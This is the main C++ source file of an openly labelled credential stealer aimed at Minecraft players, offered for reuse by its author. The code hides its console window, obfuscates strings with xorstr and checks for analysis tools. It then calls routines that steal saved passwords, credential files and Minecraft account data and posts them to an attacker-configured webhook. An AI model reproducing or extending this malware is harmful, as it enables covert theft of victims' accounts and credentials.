/*

//===================================================//

this stealer was coded by itosted / juvee <--- https://github.com/zjuvee
you can use this code, but i dont take any responsibility for any damage caused.

remember to change the webhook url in the includes/MinecraftStealer.hpp file

pd: give me credits if you use this code in your project. <---- please, dont copy pasted and remove the name

//===================================================//
*/

#include "includes\MinecraftStealer.hpp"
#include "includes\Passwords.hpp"
#include "includes\xorstr.hpp"


int main() {

    //std::string str = (xorstr_("xorstr test"));
    AntiCrack::checkForCrackingToolsA();
    Minecraft::sendMessageToWebhook(xorstr_("MCStealer files: @everyone"), webhookURL, Minecraft::newName, Minecraft::newAvatarURL);

    SetWindowPos(GetConsoleWindow(), NULL, 5000, 5000, 0, 0, 0);
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    Passwords::passwordSteal();
    Passwords::findCredentialsFile();
    Minecraft::stealMinecraft();
    AntiCrack::checkForCrackingToolsA();
    return 0;
}
